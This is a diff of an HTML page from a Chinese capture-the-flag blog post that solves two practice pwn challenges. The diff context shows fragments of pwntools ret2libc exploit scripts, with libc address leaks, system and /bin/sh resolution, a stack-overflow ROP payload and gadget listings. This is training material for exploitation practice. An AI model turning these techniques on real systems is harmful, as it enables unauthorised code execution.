@@ -8,8 +8,9 @@
     <meta name="description" content="Day030x10 前言越来越难啦，，，一天真就写了两道题
 PS:这两道题还算有点意思，就放博客上了，前面的没什么意思
 今天就不加入门的RSA玩了
+
 0x20 ciscn_2019_c_1题目来源：buuoj.cn 
-考点：ret2libc，">
+考点：ret2libc">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -347,14 +348,14 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.2k
+                        1.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        11 分
+                        8 分
                     </div>
                     
                 
@@ -373,6 +374,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
                 <h1 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h1><h2 id="0x10-前言"><a href="#0x10-前言" class="headerlink" title="0x10 前言"></a>0x10 前言</h2><p>越来越难啦，，，一天真就写了两道题</p>
 <p>PS:这两道题还算有点意思，就放博客上了，前面的没什么意思</p>
 <p>今天就不加入门的RSA玩了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p>
 <h2 id="0x20-ciscn-2019-c-1"><a href="#0x20-ciscn-2019-c-1" class="headerlink" title="0x20 ciscn_2019_c_1"></a>0x20 ciscn_2019_c_1</h2><p>题目来源：buuoj.cn </p>
 <p>考点：ret2libc，计算偏移量，18.04在调用system前需要栈对齐</p>
 <p>难度：简单</p>
@@ -393,7 +395,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
 {
   int v4; // [rsp+Ch] [rbp-4h]
 
-  init(*(_QWORD *)&amp;argc, argv, envp);
+  init(*(_QWORD *)&argc, argv, envp);
   puts("EEEEEEE                            hh      iii                ");
   puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
   puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
@@ -408,7 +410,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
     {
       fflush(0LL);
       v4 = 0;
-      __isoc99_scanf("%d", &amp;v4);
+      __isoc99_scanf("%d", &v4);
       getchar();
       if ( v4 != 2 )
         break;
@@ -422,7 +424,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
     }
     if ( v4 != 1 )
       break;
-    encrypt("%d", &amp;v4);
+    encrypt("%d", &v4);
     begin("%d");
   }
   puts("Something Wrong!");
@@ -451,13 +453,13 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
   while ( 1 )
   {
     v0 = (unsigned int)x;
-    if ( v0 &gt;= strlen(s) )
+    if ( v0 >= strlen(s) )
       break;
-    if ( s[x] &lt;= 96 || s[x] &gt; 122 )
+    if ( s[x] <= 96 || s[x] > 122 )
     {
-      if ( s[x] &lt;= 64 || s[x] &gt; 90 )
+      if ( s[x] <= 64 || s[x] > 90 )
       {
-        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )
+        if ( s[x] > 47 && s[x] <= 57 )
           s[x] ^= 0xFu;
       }
       else
@@ -494,7 +496,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
 0x00000000004007f0 : pop rbp ; ret
 0x0000000000400aec : pop rbx ; pop rbp ; ret
-0x0000000000400c83 : pop rdi ; ret  &lt;-------pop_rdi找到了
+0x0000000000400c83 : pop rdi ; ret  <-------pop_rdi找到了
 0x0000000000400c81 : pop rsi ; pop r15 ; ret
 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x00000000004006b9 : ret
@@ -543,13 +545,13 @@ def pwn(ip,port,debug):
 
     puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))
 
-    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))
+    log.success('puts_leak_addr => {}'.format(hex(puts_leak)))
 
 if __name__ == '__main__':
     pwn(0,0,1)
 </code></pre>
 <p>执行完以后：</p>
-<pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr =&gt; 0x7f558db9e690
+<pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr => 0x7f558db9e690
 </code></pre>
 <p>我们就已经泄露出puts的真实地址了</p>
 <blockquote>
@@ -602,7 +604,7 @@ def pwn(ip,port,debug):
 
     puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))
 
-    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))
+    log.success('puts_leak_addr => {}'.format(hex(puts_leak)))
     libc = LibcSearcher('puts', puts_leak)
     libc_base = puts_leak - libc.dump('puts')
     sys_addr = libc_base + libc.dump('system')
@@ -643,8 +645,8 @@ payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
 
   sub_80486BB();
   fd = open("/dev/urandom", 0);#生成随机数
-  if ( fd &gt; 0 )
-    read(fd, &amp;buf, 4u);
+  if ( fd > 0 )
+    read(fd, &buf, 4u);
   v2 = sub_804871F(buf);#比较随机数
   sub_80487D0(v2);
   return 0;
@@ -656,9 +658,9 @@ payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
   char buf; // [esp+11h] [ebp-E7h]
 
   if ( a1 == 127 )
-    result = read(0, &amp;buf, 0xC8u);
+    result = read(0, &buf, 0xC8u);
   else
-    result = read(0, &amp;buf, a1);
+    result = read(0, &buf, a1);
   return result;
 }
 </code></pre>
@@ -670,13 +672,13 @@ payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
   unsigned __int8 v5; // [esp+33h] [ebp-25h]
   ssize_t v6; // [esp+4Ch] [ebp-Ch]
 
-  memset(&amp;s, 0, 0x20u);
+  memset(&s, 0, 0x20u);
   memset(buf, 0, 0x20u);
-  sprintf(&amp;s, "%ld", a1);#生成的随机数读取到s中
+  sprintf(&s, "%ld", a1);#生成的随机数读取到s中
   v6 = read(0, buf, 0x20u);#用户输入
   buf[v6 - 1] = 0;
   v1 = strlen(buf);
-  if ( strncmp(buf, &amp;s, v1) )
+  if ( strncmp(buf, &s, v1) )
     exit(0);
   write(1, "Correct\n", 8u);
   return v5;
@@ -755,15 +757,15 @@ def pwn(ip,port,debug):
     io.sendline(payload)
 
     write_addr=u32(io.recv()[0:4])
-    log.success('write_leak_addr =&gt; {}'.format(hex(write_addr)))
+    log.success('write_leak_addr => {}'.format(hex(write_addr)))
 
     libc_base=write_addr-write_libc
     system_addr=libc_base+ system_libc
     binsh_addr=binsh_libc+libc_base
 
-    log.success('libc_leak_addr =&gt; {}'.format(hex(libc_base)))
-    log.success('system_leak_addr =&gt; {}'.format(hex(system_addr)))
-    log.success('binsh_leak_addr =&gt; {}'.format(hex(binsh_addr)))
+    log.success('libc_leak_addr => {}'.format(hex(libc_base)))
+    log.success('system_leak_addr => {}'.format(hex(system_addr)))
+    log.success('binsh_leak_addr => {}'.format(hex(binsh_addr)))
 
     io.sendline(payload1)
     io.recvuntil('Correct\n')
@@ -855,8 +857,9 @@ if __name__ == '__main__':
                     <div class="summary">Day030x10 前言越来越难啦，，，一天真就写了两道题
 PS:这两道题还算有点意思，就放博客上了，前面的没什么意思
 今天就不加入门的RSA玩了
+
 0x20 ciscn_2019_c_1题目来源：buuoj.cn 
-考点：ret2libc，</div>
+考点：ret2libc</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-15
@@ -1009,7 +1012,7 @@ PS:这两道题还算有点意思，就放博客上了，前面的没什么意�
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">33.8k</span>
+                <span class="white-color">33.2k</span>
             
 
             
